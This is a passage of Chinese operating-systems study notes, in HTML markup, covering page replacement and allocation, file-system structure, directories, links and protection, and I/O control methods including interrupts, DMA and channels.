条件都相同时，应优先淘汰没有修改过的页面，避免 / O 操作。这就是改进型的时钟置换算法的思想。&lt;br&gt;
修改位 = 0，表示页面没有被修改过；修改位 = 1，表示页面被修改过。&lt;/p&gt;
&lt;p&gt;优先淘汰没有被修改过的，因为没有修改过的不用进行 IO 操作 00-&amp;gt;01（改）-&amp;gt;00-&amp;gt;01&lt;/p&gt;
&lt;p&gt;淘汰一个页面 最多经历四轮扫描&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://lcx-1317609581.cos.ap-beijing.myqcloud.com/image-20230803223354930.png&#34; alt=&#34;image-20230803223354930&#34;&gt;&lt;/p&gt;
&lt;h3 id=&#34;32_4-页面分配策略&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#32_4-页面分配策略&#34;&gt;#&lt;/a&gt; 3.2_4 页面分配策略&lt;/h3&gt;
&lt;p&gt;1、驻留集&lt;/p&gt;
&lt;p&gt;指请求分页存储管理中给进程分配的物理块的集合&lt;/p&gt;
&lt;p&gt;在采用了虚拟存储技术的系统中，驻留集大小一般小于进程的总大小。&lt;/p&gt;
&lt;p&gt;若驻留集太小，会导致缺页频繁，系统要花大量的时间来处理缺页，实际用于进程推进的时间很少：&lt;br&gt;
驻留集太大，又会导致多道程序并发度下降，资源利用率降低。所以应该选择一个合适的驻留集大小。&lt;/p&gt;
&lt;p&gt;2、页面分配、置换策略&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;固定分配局部替换：驻留集大小不可改变&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;固定分配全局置换不存在&lt;/p&gt;
&lt;p&gt;固定分配局部置换：系统为每个进程分配一定数量的物理块，在整个运行期间都不改变。若进程在运&lt;br&gt;
行中发生缺页，则只能从该进程在内存中的页面中选出一页换出，然后再调入需要的页面。这种策略&lt;br&gt;
的缺点是：很难在刚开始就确定应为每个进程分配多少个物理块才算合理。&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;可变分配：驻留集大小可变&lt;/strong&gt;&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;strong&gt;可变分配全局替换：可以将操作系统保留的空闲物理块分配给缺页进程&lt;/strong&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;可变分配全局罩换：刚开始会为每个进程分配一定数量的物理块。操作系统会保持一个空闲物理块队&lt;br&gt;
列。当某进程发生缺页时，从空闲物理块中取出一块分配给该进程；若已无空闲物理块，则可选择一&lt;br&gt;
个未锁定的页面换出外存，再将该物理块分配给缺页的进程。采用这种策略时，只要某进程发生缺页，&lt;br&gt;
都将获得新的物理块，仅当空闲物理块用完时，系统才选择一个未锁定的页面调出。被选择调出的页&lt;br&gt;
可能是系统中任何一个进程中的页，因此这个被选中的进程拥有的物理块会减少，缺页率会增加。&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;strong&gt;可变分配局部替换：发生缺页时只能选进程自己的物理块置换&lt;/strong&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;可变分配局部置换：刚开始会为每个进程分配一定数量的物理块。当某进程发生缺页时，只允许从该&lt;br&gt;
进程自己的物理块中选出一个进行换出外存。如果进程在运行中频繁地缺页，系统会为该进程多分配&lt;br&gt;
几个物理块，直至该进程缺页率趋势适当程度；反之，如果进程在运行中缺页率特别低，则可适当减&lt;br&gt;
少分配给该进程的物理块。&lt;/p&gt;
&lt;p&gt;3、调入页面的时机&lt;/p&gt;
&lt;p&gt;预调页策略：一次调用若干个相邻页面，主要用于进程的首次调入&lt;/p&gt;
&lt;p&gt;请求调页策略：运行发现缺页时将缺页面调入内存  缺点：I/O 开销较大&lt;/p&gt;
&lt;p&gt;4、从何处调页&lt;/p&gt;
&lt;p&gt;对换区：读写速度快，采用连续分配方式&lt;/p&gt;
&lt;p&gt;文件区：读写速度慢，采用离散分配方式&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://lcx-1317609581.cos.ap-beijing.myqcloud.com/image-20230804145355874.png&#34; alt=&#34;image-20230804145355874&#34;&gt;&lt;/p&gt;
&lt;p&gt;5、抖动（颠簸）现象&lt;/p&gt;
&lt;p&gt;刚刚换出的又要换入，刚刚换入的又要换出，物理块不够&lt;/p&gt;
&lt;p&gt;6、工作集&lt;/p&gt;
&lt;p&gt;指在某段时间间隔里，进程实际访问页面的集合&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://lcx-1317609581.cos.ap-beijing.myqcloud.com/image-20230804152323394.png&#34; alt=&#34;image-20230804152323394&#34;&gt;&lt;/p&gt;
&lt;h3 id=&#34;41_1-初识文件管理&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#41_1-初识文件管理&#34;&gt;#&lt;/a&gt; 4.1_1 初识文件管理&lt;/h3&gt;
&lt;p&gt;文件：就是一组有意义的信息 / 数据集合&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;操作系统向上提供的五个基础功能&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;创建文件 (create. 系统调用)&lt;br&gt;
 删除文件 (delete 系统调用)&lt;br&gt;
 读文件 (read 系统调用)&lt;br&gt;
 写文件 (write 系统调用)&lt;br&gt;
 打开文件 (open 系统调用)&lt;br&gt;
 关闭文件 (close. 系统调用)&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;文件的属性&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;文件名&lt;/strong&gt;：由创建文件的用户决定文件名，主要是为了方便用户找到文件，同一目录下不允许有重名文件&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;标识符&lt;/strong&gt;：一个系统内的各文件标识符唯一，对用户来说毫无可读性因此标识符只是操作系统用于区分&lt;br&gt;
各个文件的一种内部名称&lt;br&gt;
&lt;strong&gt;类型&lt;/strong&gt;：指明文件的类型&lt;br&gt;
&lt;strong&gt;位置&lt;/strong&gt;：文件存放的路径（让用户使用)、在外存中的地址（操作系统使用，对用户不可见)&lt;br&gt;
&lt;strong&gt; 大小&lt;/strong&gt;：指明文件大小创建时间、上次修改时间文件所有者信息&lt;br&gt;
&lt;strong&gt;保护信息&lt;/strong&gt;：对文件进行保护的访问控制信息&lt;/p&gt;
&lt;p&gt;提供的功能：&lt;/p&gt;
&lt;p&gt;处理机管理&lt;/p&gt;
&lt;p&gt;存储器管理&lt;/p&gt;
&lt;p&gt;文件管理&lt;/p&gt;
&lt;p&gt;设备管理&lt;/p&gt;
&lt;p&gt;目标：安全高效&lt;/p&gt;
&lt;h3 id=&#34;41_2-文件的逻辑结构&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#41_2-文件的逻辑结构&#34;&gt;#&lt;/a&gt; 4.1_2 文件的逻辑结构&lt;/h3&gt;
&lt;p&gt;文件的逻辑结构：从用户观点所观察的文件组织形式&lt;/p&gt;
&lt;p&gt;文件的物理结构：文件的存储结构，指系统将文件存储在外存上所形成的一种存储组织形式&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;无结构文件&lt;/strong&gt;：文件内部的数据就是一系列二进制流或字符流组成。又称 “流式文件”。如：&lt;br&gt;
Windows 操作系统中的.txt 文件&lt;br&gt;
&lt;strong&gt;有结构文件&lt;/strong&gt;：由一组相似的记录组成，又称 “记录式文件”。每条记录又若干个数据项组成。如：&lt;br&gt;
数据库表文件。一般来说，每条记录有一个数据项可作为关键字（作为识别不同记录的 D〉&lt;/p&gt;
&lt;p&gt;2、有结构文件（记录式文件）&lt;/p&gt;
&lt;p&gt;按文件的组织方式分类（针对有结构文件而言）：顺序文件、索引文件、索引顺序文件、直接文件、哈希文件&lt;/p&gt;
&lt;p&gt;1、&lt;strong&gt;顺序文件&lt;/strong&gt;：文件中的记录一个接一个顺序排列，记录可以是定长或可变长，各个记录在物理上可以顺序存储或者链式存储&lt;/p&gt;
&lt;p&gt;按照是否与关键字顺序有关，可以分为串结构和顺序结构&lt;/p&gt;
&lt;p&gt;链式存储：无论是定长何变长记录，都无法实现随机存取，每次只能从第一个记录开始依次往后查找&lt;/p&gt;
&lt;p&gt;顺序存储：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;可变长：无法实现随机存取。每次只能从第一个记录开始依次往后查找&lt;/li&gt;
&lt;li&gt;定长：&lt;/li&gt;
&lt;li&gt;可实现随机存取。记录长度为 L, 则第 ⅰ 个记录存放的相对位置是 i*L&lt;/li&gt;
&lt;li&gt;若采用串结构，无法快速找到某关键字对应的记录&lt;/li&gt;
&lt;li&gt;若采用顺序结构，可以快速找到某关键字对应的记录&lt;br&gt;
 (如折半查找)&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;顺序文件的缺点是增加 / 删除一个记录比较困难&lt;/p&gt;
&lt;p&gt;2、&lt;strong&gt;索引文件&lt;/strong&gt;：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;按关键字建立索引：为变长记录文件建立一张索引表、索引表按关键字排序、实现直接存取&lt;/li&gt;
&lt;li&gt;具有多个索引表的索引文件：为顺序文件建立多个索引表、为每一个可能成为检索条件的域配置一张索引表&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;3、&lt;strong&gt;索引顺序文件&lt;/strong&gt;：多级索引表嵌套查找&lt;/p&gt;
&lt;p&gt;若采用索引顺序文件结构，可把 10000 个记录分为 V10000=100 组，每组 100 个记录。则需要先顺序查找&lt;br&gt;
索引表找到分组（共 100 个分组，因此索引表长度为 100，平均需要查 50 次），找到分组后，再在分组中&lt;br&gt;
顺序查找记录（每个分组 100 个记录，因此平均需要查 50 次）。可见，采用索引顺序文件结构后，平均查&lt;br&gt;
找次数减少为 50+50=100 次。&lt;/p&gt;
&lt;h3 id=&#34;41_3-文件目录&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#41_3-文件目录&#34;&gt;#&lt;/a&gt; 4.1_3 文件目录&lt;/h3&gt;
&lt;p&gt;1、文件控制块（FCB）&lt;/p&gt;
&lt;p&gt;一个文件对应一个 FCB, 一个 FCB 就是一个目录下，多个 FCB 组成文件目录&lt;/p&gt;
&lt;p&gt;对文件目录进行的操作：搜索、创建文件、删除文件、显示目录、修改目录&lt;/p&gt;
&lt;p&gt;2、目录结构&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;
&lt;p&gt;单级目录结构：实现了按名存取 但是不允许文件重名&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;两级目录结构 分为主文件目录（MFD) 和用户文件目录（UFD)    允许不同用户的文件重名但不能对文件进行分类&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;多级目录结构（树形目录结构）&lt;/p&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;不同目录下的文件 key 重名，可以对文件进行分类，不方便文件共享&lt;/p&gt;
&lt;p&gt;系统根据文件路径找到目标文件&lt;/p&gt;
&lt;p&gt;从根目录出发的路径称为绝对路径比如 / Suiyu/1.jpg&lt;/p&gt;
&lt;p&gt;从当前目录出发的是相对路径&lt;/p&gt;
&lt;p&gt;linux 中  “.” 表示当前目录  比如./suiyu/1.jpg 表示从当前目录出发的相对路径&lt;/p&gt;
&lt;p&gt;首先从外存读入根目录的目录表  找到 suiyu 存放的位置  在从外存读入对应的目录表  找到 1.jpg 的存放位置，整个过程需要三次读磁盘 I/O 操作&lt;/p&gt;
&lt;p&gt;树形目录结构可以很方便地对文件进行分类，层次结构清晰，也能够更有效地进行文件的管理和保护。&lt;strong&gt;但&lt;/strong&gt;&lt;br&gt;
&lt;strong&gt;是，树形结构不便于实现文件的共享&lt;/strong&gt;。&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;
&lt;p&gt;无环图目录 结构&lt;/p&gt;
&lt;p&gt;在属性目录的解出上，增加了一些指向同一节点的有向边，使整个目录成为一个有向无环图&lt;/p&gt;
&lt;p&gt;可以共享  可以用不同的文件名指向同一个文件&lt;/p&gt;
&lt;p&gt;需要为每个共享结点设置一个共享计数器，用于记录此时有多少个地方在共享该结点。用户提出删除结点的请求时，只是删除该用户的 FCB、并使共享计数器减 1，并不会直接删除共享结点。&lt;/p&gt;
&lt;p&gt;只有共享计数器减为 0 时才删除结点。&lt;/p&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;3、索引节点（对文件控制块&lt;/p&gt;
&lt;p&gt;除了文件名之外的所有信息都放到索引结点中，每个文件对应一个索引结点&lt;br&gt;
目录项中只包含文件名、索引结点指针，因此每个目录项的长度大幅减小&lt;br&gt;
由于目录项长度减小，因此每个磁盘块可以存放更多个目录项，因此检索文件时磁盘 / O 的次数就少了很多&lt;/p&gt;
&lt;h3 id=&#34;41_6-文件的基本操作&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#41_6-文件的基本操作&#34;&gt;#&lt;/a&gt; 4.1_6 文件的基本操作&lt;/h3&gt;
&lt;p&gt;&lt;strong&gt;创建文件（create）&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;需要提供的几个主要参数：1、文件存放路径  2、文件名 3、所需外存大小&lt;/p&gt;
&lt;p&gt;主要做的事&lt;/p&gt;
&lt;p&gt;1、在外存中找到文件所需的空间&lt;/p&gt;
&lt;p&gt;2、创建该文件对应的目录项&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;删除文件 (delete)&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;需要提供的几个主要参数：1、文件存放路径  2、文件名&lt;/p&gt;
&lt;p&gt;主要做的事&lt;/p&gt;
&lt;p&gt;1、找到文件名对应的目录项&lt;/p&gt;
&lt;p&gt;2、回收文件占用的磁盘块&lt;/p&gt;
&lt;p&gt;3、删除文件对应的目录项&lt;/p&gt;
&lt;p&gt;读文件 (read)&lt;/p&gt;
&lt;p&gt;写文件 (write)&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;打开文件 (open)&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;需要提供的几个主要参数：1、文件存放路径  2、文件名 3、要对文件的操作类型 （如 r 只读  rw 读写）&lt;/p&gt;
&lt;p&gt;主要做的事&lt;/p&gt;
&lt;p&gt;1、找到文件名对应的目录项&lt;/p&gt;
&lt;p&gt;2、将目录项复制到内存中的 “打开文件” 中&lt;/p&gt;
&lt;p&gt;进程打开表中特有的属性：读写指针，访问权限&lt;/p&gt;
&lt;p&gt;系统打开文件表中特有的属性：打开计数器（有多少进程打开了该文件）&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;关闭文件 (close)&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;主要做的事&lt;/p&gt;
&lt;p&gt;1、将进程文件表相应的表项删除&lt;/p&gt;
&lt;p&gt;2. 回收分配给该文件的内存空间等资源&lt;br&gt;
 3. 系统打开文件表的打开计数器 count 减 1，若 count=0, 则删除对应表项。&lt;/p&gt;
&lt;h3 id=&#34;41_7-文件共享&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#41_7-文件共享&#34;&gt;#&lt;/a&gt; 4.1_7 文件共享&lt;/h3&gt;
&lt;p&gt;1、基于索引结点的共享方式（硬链接）&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;直接指向文件的索引节点&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;各个用户的目录项指向同一个索引结点&lt;br&gt;
索引结点中需要有链接计数 count&lt;br&gt;
 某用户想删除文件时，只是删除该用户的目录项，且 count—&lt;br&gt;
 只有 cout==0 时才能真正删除文件数据和索引结点，否则会导致指针悬空&lt;/p&gt;
&lt;p&gt;2、基于符号链的共享方式（软链接）&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;相当于 win 的快捷方式&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;在一个 Link 型的文件中记录共享文件的存放路径 (Windows 快捷方式)&lt;br&gt;
 操作系统根据路径一层层查找目录，最终找到共享文件&lt;br&gt;
即使软链接指向的共享文件已被删除，Lik 型文件依然存在，只是通过 Lik 型文件中的路径去查找共享文件会失败（找不到对应目录项）&lt;br&gt;
由于用软链接的方式访问共享文件时要查询多级目录，会有多次磁盘 I/O, 因此用软链接访问&lt;/p&gt;
&lt;h3 id=&#34;41_8-文件保护&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#41_8-文件保护&#34;&gt;#&lt;/a&gt; 4.1_8 文件保护&lt;/h3&gt;
&lt;p&gt;1、口令保护&lt;/p&gt;
&lt;p&gt;优点：保存口令的空间开销不多，验证口令的时间开销也很小&lt;/p&gt;
&lt;p&gt;缺点：正确的口令存放在系统内部，不够安全。&lt;/p&gt;
&lt;p&gt;2、加密保护&lt;/p&gt;
&lt;p&gt;使用某个密码对文件进行加密，在访问&lt;/p&gt;
&lt;p&gt;优点：保密性强，不需要在系统中存储 “密码&lt;/p&gt;
&lt;p&gt;缺点：加密 / 解密，需要花费一定时间&lt;/p&gt;
&lt;p&gt;3、访问控制&lt;br&gt;
在每个文件的 FCB（或索引结点）中增加一个访问控制表（ACL），该表记录了各个用户可以对该文件执行哪些操作 如：读，写，执行，添加，删除，列表清单（列出文件名和文件属性）&lt;/p&gt;
&lt;h3 id=&#34;41_9-文件系统的层次结构简单了解就行&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#41_9-文件系统的层次结构简单了解就行&#34;&gt;#&lt;/a&gt; 4.1_9 文件系统的层次结构（简单了解就行）&lt;/h3&gt;
&lt;p&gt;用户 / 应用程序&lt;/p&gt;
&lt;p&gt;用户接口&lt;/p&gt;
&lt;p&gt;文件目录系统&lt;/p&gt;
&lt;p&gt;存取控制模块&lt;/p&gt;
&lt;p&gt;逻辑文件系统与文件信息缓冲区&lt;/p&gt;
&lt;p&gt;物理文件系统&lt;/p&gt;
&lt;p&gt;辅助分配模块 设备管理模块&lt;/p&gt;
&lt;p&gt;设备&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://lcx-1317609581.cos.ap-beijing.myqcloud.com/image-20230807133112367.png&#34; alt=&#34;image-20230807133112367&#34;&gt;&lt;/p&gt;
&lt;h3 id=&#34;51_1-i-o设备的概念和分类&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#51_1-i-o设备的概念和分类&#34;&gt;#&lt;/a&gt; 5.1_1 I-O 设备的概念和分类&lt;/h3&gt;
&lt;p&gt;1、什么是 I/O 设备&lt;/p&gt;
&lt;p&gt;输入 / 输出&lt;/p&gt;
&lt;p&gt;2、按使用特性分类&lt;/p&gt;
&lt;p&gt;人机交互的外部设备（鼠标 键盘）  数据传输速度慢&lt;/p&gt;
&lt;p&gt;存储设备   数据传输速度快&lt;/p&gt;
&lt;p&gt;网络通信设备  数据传输速度介于上述二者之间&lt;/p&gt;
&lt;p&gt;3、按传输速率分类&lt;/p&gt;
&lt;p&gt;低速设备、中速设备、高速设备&lt;/p&gt;
&lt;p&gt;4、按信息交换的单位分类&lt;/p&gt;
&lt;p&gt;块设备 (传输快，可寻址)、字符设备（传输慢，不可寻址，常采用中断驱动方式）&lt;/p&gt;
&lt;h3 id=&#34;51_2-i-o控制器设备控制器&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#51_2-i-o控制器设备控制器&#34;&gt;#&lt;/a&gt; 5.1_2 I-O 控制器（设备控制器）&lt;/h3&gt;
&lt;p&gt;CPU 无法直接控制 I/O 设备的机械部件，因此 I/o 设备还要有一个电子部件作为 CPU 和 I/O 设备机械部&lt;br&gt;
件之间的 “中介”，用于实现 CPU 对设备的控制。&lt;strong&gt;这个电子部件就是 I/O 控制器，又称设备控制器&lt;/strong&gt;。CPU 可控制 I/O 控制器，又由 I/O 控制器来控制设备的机械部件。&lt;/p&gt;
&lt;p&gt;机械部件：鼠标等&lt;/p&gt;
&lt;p&gt;电子部件&lt;/p&gt;
&lt;p&gt;功能：&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;控制寄存器&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;1、接受和识别 CPU 发出的命令  如 read/write 命令&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;状态寄存器&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;2、向 CPU 报告设备的状态  用于记录 I/O 设备的当前状态&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;数据寄存器&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;3、数据交换&lt;/p&gt;
&lt;p&gt;输出时，数据寄存器用于暂存 CPU 发来的数据，之后再由控制器传送设备。输入时，数据寄存器用于暂存设&lt;br&gt;
备发来的数据，之后 CPU 从数据寄存器中取走数据&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;I/O 逻辑&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;4、地址识别 类似于内存地址  用来判断 CPU 要读 / 写的是哪个寄存器&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://lcx-1317609581.cos.ap-beijing.myqcloud.com/3fa359c8eb1eec40777b86bb0614bc4d.png&#34; alt=&#34;img&#34;&gt;&lt;/p&gt;
&lt;p&gt;有的计算机会让这些寄存器占用内存地址的一部分，称为内存映像 I/O: 另一些计算机则采用 I/O 专用地址，即寄存器独立编址。&lt;/p&gt;
&lt;p&gt;①设备控制器的组成部分主要包括设备控制器与 CPU 的接口，设备控制器与设备的接口、I/O 逻辑这 3 部分。&lt;/p&gt;
&lt;p&gt;②设备控制器应具备接收和识别命令、交换数据、标志和报告设备的状态、缓冲地址、识别数据、控制差错等功能。&lt;/p&gt;
&lt;h3 id=&#34;51_3-i-o控制方式&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#51_3-i-o控制方式&#34;&gt;#&lt;/a&gt; 5.1_3 I-O 控制方式&lt;/h3&gt;
&lt;h4 id=&#34;1-程序直接控制方式&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#1-程序直接控制方式&#34;&gt;#&lt;/a&gt; &lt;strong&gt;1、程序直接控制方式&lt;/strong&gt;&lt;/h4&gt;
&lt;p&gt;轮询：完成一次读 / 写操作的流程&lt;/p&gt;
&lt;p&gt;1.CPU 干预的频率&lt;br&gt;
很频繁，I/O 操作开始之前、完成之后需要 CPU 介入，并且&lt;br&gt;
在等待 I/O 完成的过程中 CPU 需要不断地轮询检查。&lt;br&gt;
2. 数据传送的单位&lt;br&gt;
每次读 / 写一个字&lt;br&gt;
 3. 数据的流向&lt;br&gt;
读操作（数据输入）：I/O 设备→CPU→内存&lt;br&gt;
写操作（数据输出）：内存→CPU→I/o 设备&lt;br&gt;
每个字的读 / 写都需要 CPU 的帮助&lt;/p&gt;
&lt;p&gt;4. 主要缺点和主要优点&lt;br&gt;
优点：实现简单。在读 / 写指令之后，加上实现循环检查的&lt;br&gt;
一系列指令即可（因此才称为 “程序直接控制方式”）&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://lcx-1317609581.cos.ap-beijing.myqcloud.com/image-20230807213054899.png&#34; alt=&#34;image-20230807213054899&#34;&gt;&lt;/p&gt;
&lt;h4 id=&#34;2-中断驱动方式&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#2-中断驱动方式&#34;&gt;#&lt;/a&gt; &lt;strong&gt;2、中断驱动方式&lt;/strong&gt;&lt;/h4&gt;
&lt;p&gt;引入中断机制。由于 I/O 设备速度很慢，因此在 CPU 发出读写命令后，可将等待 I/O 的进程阻塞，先切换到别的进程执行。当 I/O 完成后，控制器会向 CPU 发出一个中断信号，CPU 检测到中断信号后，会保存当前进程的运行环境信息，转去执行中断处理程序处理该中断。处理中断的过程中，CPU 从 I/O 控制器读一个字的数据传送到 CPU 寄存器，再写入主存。接着，CPU 恢复等待 I/O 的进程（或其他进程）的运行环境，然后继续执行&lt;/p&gt;
&lt;p&gt;2.CPU 干预的频率&lt;br&gt;
每次 I/O 操作开始之前、完成之后需要 CPU 介入。&lt;br&gt;
等待 I/O 完成的过程中 CPU 可以切换到别的进程执行。&lt;br&gt;
3. 数据传送的单位&lt;br&gt;
每次读 / 写一个字&lt;br&gt;
 4. 数据的流向&lt;br&gt;
读操作（数据输入）：I/O 设备→CPU→内存&lt;br&gt;
写操作（数据输出）：内存→CPU→I/O 设备&lt;br&gt;
 5. 主要缺点和主要优点&lt;br&gt;
优点：与 “程序直接控制方式” 相比，在 “中断驱动方式” 中，I/O 控制器会通过中断信号主动报告 I/O 已完成，CPU 不再需要不停地轮询。CPU 和 I/O 设备可并行工作，CPU 利用率得到明显提升。&lt;/p&gt;
&lt;p&gt;缺点：每个字在 I/O 设备与内存之间的传输，都需要经过 CPU。而频繁的中断处理会消耗较多的 CPU 时间。&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://lcx-1317609581.cos.ap-beijing.myqcloud.com/image-20230807213106809.png&#34; alt=&#34;image-20230807213106809&#34;&gt;&lt;/p&gt;
&lt;h4 id=&#34;3-dma方式直接存储器存取&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#3-dma方式直接存储器存取&#34;&gt;#&lt;/a&gt; &lt;strong&gt;3、DMA 方式：直接存储器存取&lt;/strong&gt;&lt;/h4&gt;
&lt;p&gt;CPU 发出 I/O 命令后可以做其他事，本次 I/O 完成后 DMA 控制器发出中断信号&lt;/p&gt;
&lt;p&gt;DR（数据寄存器)：暂存从设备到内存，或从内存到设备的数据。&lt;br&gt;
MAR (内存地址寄存器)：在输入时，MAR 表示数据应放到内存中的什么&lt;br&gt;
位置；输出时 MAR 表示要输出的数据放在内存中的什么位置。&lt;br&gt;
DC (数据计数器)：表示剩余要读 / 写的字节数。&lt;br&gt;
CR (命令 / 状态寄存器)：用于存放 CPU 发来的 I/o 命令，或设备的状态信息。&lt;/p&gt;
&lt;p&gt;2.CPU 干预的频率&lt;br&gt;
仅在传送一个或多个数据块的开始和结束时，才需要 CPU 干预。&lt;br&gt;
3. 数据传送的单位&lt;br&gt;
每次读 / 写一个或多个块（注意：每次读写的只能是连续的多个块，&lt;br&gt;
且这些块读入内存后在内存中也必须是连续的)&lt;br&gt;
 4. 数据的流向（不再需要经过 CPU)&lt;br&gt;
 读操作（数据输入）：I/O 设备→内存&lt;br&gt;
写操作（数据输出）：内存→I/O 设备&lt;/p&gt;
&lt;p&gt;5. 主要缺点和主要优点&lt;br&gt;
优点：数据传输以 “块” 为单位，CPU 介入频率进一步降低。数据的传输不再需要先经过 CPU 再写入内&lt;br&gt;
存，数据传输效率进一步增加。CPU 和 I/O 设备的并行性得到提升。&lt;br&gt;
缺点：CPU 每发出一条 I/O 指令，只能读 / 写一个或多个连续的数据块。&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://lcx-1317609581.cos.ap-beijing.myqcloud.com/image-20230807213116188.png&#34; alt=&#34;image-20230807213116188&#34;&gt;&lt;/p&gt;
&lt;h4 id=&#34;4-通道控制方式&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#4-通道控制方式&#34;&gt;#&lt;/a&gt; &lt;strong&gt;4、通道控制方式&lt;/strong&gt;&lt;/h4&gt;
&lt;p&gt;CPU 发出 I/O 命令后可以做其他事。通道会执行通道程序以完成 I/O, 完成后通道向 CPU 发出中断信号&lt;/p&gt;
&lt;p&gt;通道：通道是一种特殊的处理机，它具有执行 I/O 指令的能力，并且可以通过执行&lt;br&gt;
通道 I/O 程序来控制 I/O 操作。&lt;/p&gt;
&lt;p&gt;通道程序：任务清单&lt;/p&gt;
&lt;p&gt;2.CPU 干预的频率&lt;br&gt;
极低，通道会根据 CPU 的指示执行相应的通道程序，只有完成一组数据块&lt;br&gt;
的读 / 写后才需要发出中断信号，请求 CPU 千预。&lt;br&gt;
3. 数据传送的单位&lt;br&gt;
每次读 / 写一组数据块&lt;br&gt;
 4. 数据的流向（在通道的控制下进行）&lt;br&gt;
读操作（数据输入）：I/O 设备→内存&lt;br&gt;
写操作（数据输出）：内存→I/O 设备&lt;br&gt;
 5. 主要缺点和主要优点&lt;br&gt;
缺点：实现复杂，需要专门的通道硬件支持&lt;br&gt;
优点：CPU、通道、/O 设备可并行工作，资源利用率很高。&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://lcx-1317609581.cos.ap-beijing.myqcloud.com/image-20230807213132075.png&#34; alt=&#34;image-20230807213132075&#34;&gt;&lt;/p&gt;
&lt;h3 id=&#34;51_4-i-o软件层次结构&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#51_4-i-o软件层次结构&#34;&gt;#&lt;/a&gt; 5.1_4 I-O 软件层次结构&lt;/h3&gt;
&lt;p&gt;&lt;strong&gt;1、用户层软件&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;实现与用户交互的接口，向上提供方便易用的库函数&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;2、设备独立性软件（设备无关性软件）&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;主要实现的功能：&lt;/p&gt;
&lt;p&gt;1、向上层提供统一的调用接口（read/write）&lt;/p&gt;
&lt;p&gt;2、设备的保护&lt;/p&gt;
&lt;p&gt;3、差错处理&lt;/p&gt;
&lt;p&gt;4、设备的分配与回收&lt;/p&gt;
&lt;p&gt;5、数据缓冲区管理&lt;/p&gt;
&lt;p&gt;6、建立逻辑设备名到物理设备名的映射关系&lt;/p&gt;
&lt;p&gt;操作系统系统可以采用两种方式管理逻辑设备表 (LUT):&lt;br&gt;
 第一种方式，整个系统只设置一张 LUT, 这就意味着所有用户不能使用相同的逻辑设备名，因此这&lt;br&gt;
种方式只适用于单用户操作系统。&lt;br&gt;
第二种方式，为每个用户设置一张 LUT, 各个用户使用的逻辑设备名可以重复，适用于多用户操作&lt;br&gt;
